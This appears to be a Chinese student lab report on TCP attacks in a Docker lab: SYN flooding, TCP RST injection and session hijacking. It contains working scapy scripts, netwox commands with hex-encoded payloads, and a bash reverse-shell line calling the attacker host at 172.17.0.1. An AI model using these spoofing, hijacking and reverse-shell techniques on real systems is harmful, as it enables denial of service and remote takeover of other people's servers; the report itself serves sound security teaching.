# 博客链接

[计算机网络安全实验一｜TCP协议漏洞及利用_shandianchengzi的博客-CSDN博客](https://blog.csdn.net/qq_46106285/article/details/124227412)

# docker使用

## 建立实验环境

普通用户： seed 密码:dees
超级用户：root 密码：seedubuntu

Network(bridge)：172.17.0.0/16：

server是已经创建好的，如果没有，就按照创建User的方式创建。

创建user：

```bash
sudo docker run -it --name=user --hostname=user --privileged "seedubuntu" /bin/bash
```

我的ip：

```bash
Attacker：172.17.0.1 # 也就是虚拟机seed@VM
server：172.17.0.4
user：172.17.0.2
```

## docker常用指令

打开或停止HostM：

```bash
sudo docker start/stop HostM
```

把HostM映射到bash中：

```bash
sudo docker exec -it HostM /bin/bash
```

查看当前docker有哪些：

```bash
sudo docker ps -a
```

关闭防火墙：

```bash
sudo iptables -F
```

# netwox工具使用

Netwox是一款非常强大和易用的开源工
具包，可以创造任意的TCP/UDP/IP数据
报文。Netwox工具包中包含了超过200
个不同功能的网络报文生成工具，每个工具
都拥有一个特定的**编号**。

指令格式：

```bash
netwox number 参数
```

具体命令可查：

```bash
netwox number --help
```

## netwox常用指令的编号

运行netwox，输入3，可以按照关键词搜
素想要的工具。
 76 Syn-flood工具
 78 TCP RST攻击
 40 TCP会话劫持
 0 退出netwox

# 其他常用指令

①telnet：

开启telnet服务：

```bash
sudo /etc/init.d/openbsd-inetd restart # telnet服务启动
sudo netstat -a | grep telnet # 查看telnet的运行状态
```

连接服务器：

```bash
telnet 172.17.0.4
```

②cookie机制开关：

查看cookie是否开启：

```bash
sysctl -a | grep cookie
```

关闭cookie机制：

```bash
sysctl net.ipv4.tcp_syncookies=0
```

打开cookie机制：

```bash
sysctl net.ipv4.tcp_syncookies=1
```

③wireshark：

新建终端，打开any网卡。

![在这里插入图片描述](https://img-blog.csdnimg.cn/f3ff3dc1062348639cb7e11f509fbeab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc2hhbmRpYW5jaGVuZ3pp,size_20,color_FFFFFF,t_70,g_se,x_16)


④查看当前的连接的状态：

```bash
netstat -nat
```

<div STYLE="page-break-after: always;"></div>

# 任务1 SYN-Flooding攻击

SYN flood  是DoS攻击的一种。攻击者使用假冒 IP 地址或故意不完成三次握手，利用 TCP 半开连接，预支资源。

本实验目标是消耗服务器资源，服务器docker的ip是172.17.0.4。

三种实现形式：

①利用netwox工具

②利用scapy

③利用c代码

## 攻击过程

### 不启用cookie

①netwox：攻击机运行`sudo netwox 76 172.17.0.4 -p 23`。

用户机尝试用telnet连接，连接超时，失败。意思是攻击成功。

![img](https://img-blog.csdnimg.cn/img_convert/47d7cada0ec4211e7dced11fade8f8eb.png)

用户机先建立连接，然后再打开攻击。

新建用户机终端运行`netstat -nat`查看连接状态：

![img](https://img-blog.csdnimg.cn/img_convert/b9e4a13ceea9482e96cdae141429c1e2.png)

可以看到，攻击后不影响原有的连接，但是无法新建telnet连接。

②scapy：修改给定脚本的目的地址，攻击机运行`sudo pip install scapy`，然后攻击机使用`sudo python ./syn_flood.py`运行攻击脚本。

运行攻击脚本、用户机telnet尝试连接如下图（左）所示，wireshark截图如下图（右）所示。

![img](https://img-blog.csdnimg.cn/img_convert/06ac56c7edb9a89e3823df348801d4b0.png)

可以看到，连接成功，攻击效果不明显。

观察wireshark，这是因为python发包速度过慢，因此尝试修改程序，将随机函数删掉，随便写个不随机的遍历函数，但是还是不行。  
因此，我尝试连续运行4个随机的python程序，等待了一分钟，再次建立连接，发现还是没有攻击成功。并且连接速度也没有放慢太多。

此时我的虚拟机已经非常卡慢，故不再继续尝试。

运行的4个程序见下图（左），攻击的失败结果见下图（右）。

![img](https://img-blog.csdnimg.cn/img_convert/6d805c677d797942829c0346e68b508a.png)

③c：修改脚本的目的地址，gcc编译，攻击机使用`sudo ./syn_flood`运行攻击脚本。

用户机尝试用telnet连接，连接超时，失败。意思是攻击成功。

![img](https://img-blog.csdnimg.cn/img_convert/eb72e767f8b3d98ef9d7f1951f7be41a.png)

### 打开cookie后

以netwox攻击为例。

下图左侧是攻击机，正在运行netwox攻击指令；右侧，上方是服务机的cookie机制开启情况，下方是攻击后用户机尝试telnet连接服务机的情况。

![img](https://img-blog.csdnimg.cn/img_convert/9fda3d9ebe06a258539eeba7525dbcb3.png)

可以看到，连接没有失败，并且不卡，说明cookie防御机制是有效的。

<div STYLE="page-break-after: always;"></div>

# 任务 2 : 针对 telnet 或 ssh 连接的 TCP RST 攻击

## 攻击过程

### netwox：

（1）Wireshark截包截图。netwox自动攻击，所以该TCP报文信息用处不大。

![img](https://img-blog.csdnimg.cn/img_convert/243c5a42823c5742173d134198ceedfa.png)

（2）攻击命令：`sudo netwok 78 -d docker0`。

![img](https://img-blog.csdnimg.cn/img_convert/df23b8572bad961f216312464d909500.png)

（3）上图是先建立连接再攻击，攻击成功，telnet连接异常中止，符合预期结果。

下图是先攻击再尝试建立连接。可以看到，先是连接时就失败了，再是连接成功后登录时被打断了。

![img](https://img-blog.csdnimg.cn/img_convert/a6f6c02bcd755d2f00d67a328c6458f1.png)

### scapy手动攻击：

（1）Wireshark截包截图。

关键信息：ip：172.17.0.2→172.17.0.4，port：59252→23，Seq：470998582。

![img](https://img-blog.csdnimg.cn/img_convert/0fcb058d657808eaa8909e9f44a53a21.png)

（2）攻击脚本：

```python
#!/usr/bin/python3
from scapy.all import *

print("SENDING RESET PACKET.........")
ip = IP(src="172.17.0.2", dst="172.17.0.4")
tcp = TCP(sport=59252, dport=23,flags="R",seq=470998582)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
```

攻击命令：`sudo python reset_manual.py`。

（3）观察和解释：成功，符合预期。如下图，图中第二个t对应攻击的tcp报文。当再输入一个t时，显示连接已经中止。

![img](https://img-blog.csdnimg.cn/img_convert/982e874d5097e2193b4cd823b2237db5.png)

而且，使用wireshark抓取报文，可以看到我们伪造的RST报文成功发出、并阻碍了通信。

![img](https://img-blog.csdnimg.cn/img_convert/822df30894f06dae8ea02f210d84985c.png)

### scapy自动攻击：

（1）Wireshark截包截图。

关键信息：ip：172.17.0.2→172.17.0.4，port：59296→23，Seq：107996481。

![img](https://img-blog.csdnimg.cn/img_convert/ab102bbb0e40a6b424f3e9a119781b2d.png)

（2）攻击命令见下图左，攻击脚本见下图右。

其中攻击脚本添加了一行判断当前截获的报文是否是RST报文，如果是则返回，以免截取到自己伪造的报文。

![img](https://img-blog.csdnimg.cn/img_convert/a5553afbf3478f5d8c88b3a00b363156.png)

（3）观察和解释：

攻击成功，攻击结果如下图所示。没有阻断telnet与服务器建立连接，但是打断了登录过程。

![img](https://img-blog.csdnimg.cn/img_convert/3552cb3abc0a94fd8f895bf5dc7dfaff.png)

这和netwox运行时的部分情况也是一致的，由于建立连接的速度太快，python程序截获到建立连接的TCP报文、并发送伪造的RST报文时，连接已经建立完毕，SEQ和伪造的RST报文对不上。所以是在登录过程中被打断，符合预期。

对应的RST报文在wireshark中截图如下。

![img](https://img-blog.csdnimg.cn/img_convert/26508d54e9b49d063fbf2447b8292bec.png)

# 任务3,4常用指令说明

## 打断会话劫持

会话劫持之后客户端可能无响应，此时最好用任务2的RST打断telnet会话，这样就不用新建客户端bash。

打断方式：

```bash
sudo netwox 78 -d docker0
```

## 反弹shell

客户端：`nc -lvp 4567`

服务端：

```bash
/bin/bash -i >/dev/tcp/172.17.0.1/4567 # 默认描述符1是标准输出，意思是把当前的bash的输出全部重定向到172.17.0.1:4567中
```

除了标准输出，还可以把标准输入(0)定向过来、错误输出(2)定向过去。总得来说，指令如下：

```bash
/bin/bash -i >/dev/tcp/172.17.0.1/4567 2>&1 0<&1
```

<div STYLE="page-break-after: always;"></div>

# 任务 3,4 : 使用 TCP 会话劫持注入普通命令、创建反向 shell

## 攻击过程

注：我认为 hijacking_auto.py 是 hijacking_manual.py 的拓展，而且netwox的过程和手动攻击基本一致，没有必要重复展示手动攻击的效果，因此实施scapy攻击时只描述自动攻击及其脚本。

### 注入普通命令"ls\r\n"

#### netwox：

（1）Wireshark截包截图：

下图是最后一个Telnet报文。

关键信息：ip：172.17.0.4→172.17.0.2，port：59366→23，Next SEQ：863211564，ACK：430198591。

![img](https://img-blog.csdnimg.cn/img_convert/28f80319409a92386d19d4e72b6fccc1.png)

（2）攻击命令：`sudo netwox 40 -l 172.17.0.2 -m 172.17.0.4 -p 23 -o 59366 --tcp-seqnum 430198591 --tcp-acknum 863211564 --tcp-data "6c730d00" --tcp-ack`。

注入的内容是"ls\r\n"。

（3）观察和解释：攻击成功。

下图是服务端返回的ls结果，显示了服务器当前目录下的文件和文件夹。

![img](https://img-blog.csdnimg.cn/img_convert/62a05e1a05eac174081553fb52c1fbfe.png)

不过可惜的是，user用户机对服务器的会话被干扰了，不能继续会话，如下图所示。

![img](https://img-blog.csdnimg.cn/img_convert/47c6404831e6bd97e49b51f44b12f183.png)

这是因为seq和ack顺序关系被破坏。

> 我认为该工具应该可以、并且需要达到更好的效果：比如边接收用户机发来的讯息，边允许攻击机持续向服务器发送指令，这只需要设置两个变量暂存seq和ack即可做到。

#### scapy：

（1）Wireshark截包截图：

攻击的是下面这张图上的TCP报文，由于采取自动攻击的方式，所以seq和ack的具体数值对程序编写来说，并不重要。

![img](https://img-blog.csdnimg.cn/img_convert/12b0a10b0f10ddc3fdf5e5827eab1678.png)

（2）攻击脚本：

```python
#!/usr/bin/python3
from scapy.all import *

SRC = "172.17.0.2"
DST = "172.17.0.4"
PORT = 23

def spoof(pkt):
  old_ip = pkt[IP]
  old_tcp = pkt[TCP]
  if(old_tcp.flags!="A"):
    return

  #############################################
  ip = IP( src  = old_ip.src,
        dst  = old_ip.dst
       )
  tcp = TCP( sport = old_tcp.sport,
        dport = old_tcp.dport,
        seq  = old_tcp.seq,
        ack  = old_tcp.ack,
        flags = "PA"
       )
  data = "ls\r\n"
  #############################################

  pkt = ip/tcp/data
  send(pkt,verbose=0)
  ls(pkt)
  #quit()

f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
sniff(filter=f, prn=spoof)
```

> **出于谨慎，我将quit()注释掉，并且只抓flags为A的报文，将自己伪造的报文的flags改成PA。**
>
> 一方面是防止抓到自己伪造的报文造成不必要的循环；
>
> 另一方面是通过观察，seq和ack符合需要的目标报文的flags往往是A，telnet报文的flags是PA，并且，不能断定两台主机之间只有telnet通信有flags为A的报文，因此不妨将quit()注释掉，多针对几个ACK包。

（3）观察和解释：

用户机运行telnet连接服务机并登录，攻击机运行python脚本，然后用户机输入一个回车，用于触发脚本。

> 注意：**用于触发脚本的符号是回车**，空格时服务器没有正常执行ls指令，具体原因不明。后来做反向shell的时候，我使用空格触发，却成功了。

在wireshark中抓包可以看到我们伪造的报文，如下图所示。

![img](https://img-blog.csdnimg.cn/img_convert/195f8be0c60992e75014660ee3a71783.png)

并且，可以进一步看到服务器运行ls时显示的结果，如下图所示。

![img](https://img-blog.csdnimg.cn/img_convert/98b47502c7a0bc35c50470fd0f105bef.png)

### 反向shell

#### netwox：

（1）Wireshark截包截图：

![img](https://img-blog.csdnimg.cn/img_convert/93f84586734fb75c367ecd54418d2cb2.png)

（2）攻击命令：

先在攻击机上运行nc -lvp 4567，对4567端口进行监听，等待服务器主动反向shell。

然后用户机和服务器建立telnet连接后，攻击机运行如下指令：

```bash
sudo netwox 40 -l 172.17.0.2 -m 172.17.0.4 -p 23 -o 59418 --tcp-seqnum 656808919 --tcp-acknum 85195549 --tcp-data "2f62696e2f62617368202d69203e2f6465762f7463702f3137322e31372e302e312f3435363720323e263120303c26310d00" --tcp-ack
```

这条攻击指令是利用TCP会话劫持运行`/bin/bash -i >/dev/tcp/172.17.0.1/4567 2>&1 0<&1`并回车。

运行的这条指令是把当前的bash的标准输出、错误输出全部重定向到172.17.0.1:4567中去，并把172.17.0.1:4567的输入重定向成为当前bash的标准输入。

（3）观察和解释：

下图上方是攻击机成功获得服务器shell的截图，下方是服务器响应"/bin/bash -i >/dev/tcp/172.17.0.1/4567 2>&1 0<&1"语句的wireshark抓包结果。

![img](https://img-blog.csdnimg.cn/img_convert/2808ad07257b8624f1e7696c884d4ea3.png)

可以看到，攻击机成功地能够显示标准输出、错误输出，并且还能将自己的输入运行在服务机运行，也就是获得了服务器的bash。

#### scapy：

（1）Wireshark截包截图：

攻击的是下面这张图上的TCP报文，由于采取自动攻击的方式，所以seq和ack的具体数值对程序编写来说，并不重要。

![img](https://img-blog.csdnimg.cn/img_convert/5a5635155a6a2b6b34e810e399df7068.png)

（2）攻击脚本：

```python
#!/usr/bin/python3
from scapy.all import *

SRC = "172.17.0.2"
DST = "172.17.0.4"
PORT = 23

def spoof(pkt):
  old_ip = pkt[IP]
  old_tcp = pkt[TCP]
  if(old_tcp.flags!="A"):
    return

  #############################################
  ip = IP( src  = old_ip.src,
        dst  = old_ip.dst
       )
  tcp = TCP( sport = old_tcp.sport,
        dport = old_tcp.dport,
        seq  = old_tcp.seq,
        ack  = old_tcp.ack,
        flags = "PA"
       )
  data = "/bin/bash -i >/dev/tcp/172.17.0.1/4567 2>&1 0<&1\r\n"
  #############################################

  pkt = ip/tcp/data
  send(pkt,verbose=0)
  ls(pkt)
  #quit()

f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
sniff(filter=f, prn=spoof)
```

（3）观察和解释：

运行脚本后，在用户机上输入一个空格，然后脚本会监听到这个输入，并使用该序列号和ACK号伪造报文。

下图上方为攻击机运行脚本的截图，下方为攻击机开启监听后获得服务器的shell的截图。

![img](https://img-blog.csdnimg.cn/img_convert/7214f57e5fb36b8ed32c21a5d798aa9a.png)

伪造的报文成功发送，在wireshark中的抓包显示如下图。可以看到，发送了Data为"/bin/bash -i >/dev/tcp/172.17.0.1/4567 2>&1 0<&1\r\n"的报文。

![img](https://img-blog.csdnimg.cn/img_convert/553e11153cebade5080e7555f3a75dab.png)